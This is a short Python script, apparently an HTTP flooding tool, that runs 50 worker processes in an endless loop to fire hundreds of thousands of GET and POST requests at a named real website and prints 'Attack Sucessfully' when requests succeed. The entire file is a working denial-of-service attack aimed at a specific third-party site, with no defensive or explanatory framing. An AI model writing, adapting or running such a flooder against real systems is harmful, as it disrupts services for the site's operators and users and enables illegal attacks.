from multiprocessing import Pool
import requests

url = "https://www.cjic.cn/enindex.jhtml"


def attack(x):
    if requests.get(url).status_code == 200:
        print(f"Attack Sucessfully: {x}")
    else:
        print(requests.get(url).status_code)
        print(requests.post(url=url, json="json.json").status_code)


if __name__ == '__main__':
    while True:
        p = Pool(50)
        p.map_async(attack, range(200000))
        p.close()
        p.join()
